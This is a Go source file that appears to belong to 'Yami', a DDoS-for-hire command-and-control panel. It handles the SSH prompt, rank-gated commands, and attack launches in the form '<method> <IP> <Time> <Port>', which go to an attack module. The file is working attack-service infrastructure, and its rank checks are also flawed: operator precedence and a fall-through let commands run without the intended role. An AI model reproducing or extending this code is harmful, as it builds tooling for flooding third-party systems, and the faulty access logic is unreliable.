package YamiView

import (
	AttacksV2 "Yami/core/attacks-v2"
	"Yami/core/models/bin"
	"Yami/core/clients/branding"
	"Yami/core/clients/client"
	"Yami/core/clients/commands"
	"Yami/core/clients/session"
	"Yami/core/db"
	"encoding/binary"

	"log"
	"strings"

	"golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

// prompt reader. command input reader.
func Prompt(channel ssh.Channel, conn *ssh.ServerConn, Session *Sessions.Session, oldrequests <-chan *ssh.Request) {

	promptoutput := terminal.NewTerminal(channel, "")

	go func() { // oob requests lmao
		for req := range oldrequests {
			switch req.Type {
			case "pty-req":
				termLen := req.Payload[3]
				w, h := ParseDims(req.Payload[termLen+4:])
				promptoutput.SetSize(int(w), int(h))
				req.Reply(true, nil)
			case "window-change":
				w, h := ParseDims(req.Payload)
				promptoutput.SetSize(int(w), int(h))
			}
		}
	}()

	LOL := Sessions.New(conn.User())

	promptoutput.AutoCompleteCallback = LOL.AutoComplete


	for {
		Prompt, err := Branding.TermFXExecutePrompt("prompt", conn)
		if err != nil {
			log.Printf("Failed to fetch prompt for home screen")
		}


		channel.Write([]byte(Prompt))
		read, err := promptoutput.ReadLine()
		if err != nil {
			channel.Write([]byte("\r\n"))
			channel.Close()
			conn.Close()
			return
		}



		Cmds(read, channel, conn, Session)

	}
}

var finish bool

var testing ssh.Channel

// command function,
// used for executing commands from the commands file
func Cmds(command string, channel ssh.Channel, conn *ssh.ServerConn, Session *Sessions.Session) {
	// splits the string by " "
	cmd := strings.Split(command, " ")
	if cmd[0] == "" {
		return
	}

	Prompt := strings.ToLower(cmd[0])

	// gets the command
	c := commands.Get(strings.ToLower(cmd[0]))
	if c == nil {

		Users, error := YamiDB.GetUser(conn.User())
		if error != nil {
			log.Println("Failed to get users info!")
		}

		if !AttacksV2.MethodCheck(cmd[0]) {
			cmds := ClientPoly.Command(Prompt)
			if cmds == nil {
				Command := BinLoad.Command(cmd[0]); if Command == nil {
					Branding.TermFXExecuteBannerCustom("command-404", conn, channel, "command", cmd[0])
					return
				}

				if Command.CommandAdmin && Users.Admin {
					commands.NewPlayer(channel, cmd, Command)
					return
				} else if Command.CommandReseller && Users.Reseller {
					commands.NewPlayer(channel, cmd, Command)
					return
				} else if Command.CommandVip && Users.Vip {
					commands.NewPlayer(channel, cmd, Command)
					return
				} else if !Command.CommandAdmin && !Command.CommandReseller && Command.CommandVip {
					commands.NewPlayer(channel, cmd, Command)
					return
				}

				commands.NewPlayer(channel, cmd, Command)
				return
			}


			if cmds.CommandAdmin && Users.Admin {
				error := Branding.TermFXExecuteCommand(cmds.CommandName, conn, channel)
				if error != nil {

					if Users.Admin {
						channel.Write([]byte(error.Error()))
						return
					}
					channel.Write([]byte("	Failed to Execute Command!\r\n"))
					return
				}
				return
			} else if cmds.CommandReseller && Users.Reseller || Users.Admin {
				error := Branding.TermFXExecuteCommand(cmds.CommandName, conn, channel)
				if error != nil {

					if Users.Admin {
						channel.Write([]byte(error.Error()))
						return
					}
					channel.Write([]byte("	Failed to Execute Command!\r\n"))
					return
				}
				return
			}

			if cmds.CommandVip && Users.Vip || Users.Admin || Users.Reseller {
				error := Branding.TermFXExecuteCommand(cmds.CommandName, conn, channel)
				if error != nil {

					if Users.Admin {
						channel.Write([]byte(error.Error()))
						return
					}
					channel.Write([]byte("	Failed to Execute Command!\r\n"))
					return
				}
				return
			}

			if !cmds.CommandAdmin && !cmds.CommandReseller && !cmds.CommandVip {
				error := Branding.TermFXExecuteCommand(cmds.CommandName, conn, channel)
				if error != nil {

					if Users.Admin {
						channel.Write([]byte(error.Error()))
						return
					}
					channel.Write([]byte("	Failed to Execute Command!\r\n"))
					return
				}
				return
			}

			return

		}

		var dport bool
		var port = "0"


		if len(cmd) != 4 {
			if len(cmd) != 3 {
				channel.Write([]byte("Invaild Attack Syntax\r\n"))
				channel.Write([]byte("Example: " + cmd[0] + " 1.1.1.1 30 80\r\n"))
				channel.Write([]byte("Syntax: " + cmd[0] + " <IP> <Time> <Port>\r\n"))
				return
			}
		}

		if len(cmd) == 4 {
			port = cmd[3]
			dport = false
		} else if len(cmd) == 3 {
			port = "0"
			dport = true
		}

		AttacksV2.NewAttack(channel, conn, cmd[1], port, cmd[2], cmd[0], dport)

		return


	}


	if commands.Check(cmd[0]) {
		Branding.TermFXExecuteBannerCustom("command-404", conn, channel, "command", cmd[0])
		return
	}
	// gets the user details
	Users, _ := YamiDB.GetUser(conn.User())

	// rank system
	if c.Admin && Users.Admin {
		if err := c.Execute(channel, conn, Session, cmd); err != nil {
			return
		}
		return
	} else if c.Reseller && Users.Reseller || Users.Admin {
		if err := c.Execute(channel, conn, Session, cmd); err != nil {
			return
		}
		return
	}

	if !c.Reseller && !c.Admin {
		if err := c.Execute(channel, conn, Session, cmd); err != nil {
			return
		}
		return
	}

	// branding
	var Role string

	if c.Reseller {
		Role = "Reseller"
	} else if c.Admin {
		Role = "Admin"
	}

	Branding.TermFXExecuteBannerCustom("command-403", conn, channel, "role", Role)
	return
}

var Working bool


func ParseDims(b []byte) (uint32, uint32) {
	w := binary.BigEndian.Uint32(b)
	h := binary.BigEndian.Uint32(b[4:])
	return w, h
}


